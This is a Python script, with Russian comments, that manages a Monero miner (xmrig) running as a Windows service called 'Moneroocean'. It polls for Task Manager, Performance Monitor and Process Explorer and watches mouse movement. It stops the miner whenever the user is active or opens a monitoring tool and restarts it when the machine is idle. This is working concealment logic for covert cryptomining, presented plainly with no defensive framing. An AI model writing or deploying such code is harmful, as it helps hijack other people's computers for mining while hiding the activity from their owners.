import psutil
import time
import subprocess
# from ctypes import windll, Structure, c_ulong, byref, c_ushort
from pynput.mouse import Controller

SOFTS_NAME = ['Taskmgr.exe', 'perfmon.exe', 'procexp64.exe', 'procexp.exe']
SERVICE_NAME = 'Moneroocean'
MINER_NAME = ['xmrig.exe']


# class POINT(Structure):
#     _fields_ = [("x", c_ulong), ("y", c_ulong)]


mouse = Controller()


# def queryMousePosition():
#
#     print('The current pointer position is {0}'.format(
#         ))
#
#     pt = POINT()
#     windll.user32.GetCursorPos(byref(pt))
#     return {"x": pt.x, "y": pt.y}


def find_procs_by_name(name):
    "Return a list of processes matching 'name'."
    ls = []
    for p in psutil.process_iter(['name']):
        for soft in name:
            if p.info['name'] == soft:
                ls.append(p)
    return ls


while True:
    mouse_position = mouse.position
    time.sleep(0.5)
    current_mouse_position = mouse.position
    s = psutil.win_service_get(SERVICE_NAME)
    # print(s.as_dict()['status'])
    if find_procs_by_name(SOFTS_NAME) or current_mouse_position != mouse_position:
        # print('Запущен диспетчер задач или шевелилась мышь')
        if s.as_dict()['status'] == 'running':
            # print('майнер запущен - останавливаю')
            # print('Служба {} запущена'.format(SERVICE_NAME))
            subprocess.call(['sc', 'stop', SERVICE_NAME])
        else:
            # print('майнер не запущен - ничего не делаю')
            pass
    else:
        # print('He 3апущен диспетчер задач')
        if not find_procs_by_name(MINER_NAME):
            # print('майнер не запущен - запускаю')
            # print(not find_procs_by_name(MINER_NAME))
            subprocess.call(['sc', 'start', SERVICE_NAME])
        else:
            # print('майнер запущен - ничего не делаю')
            pass
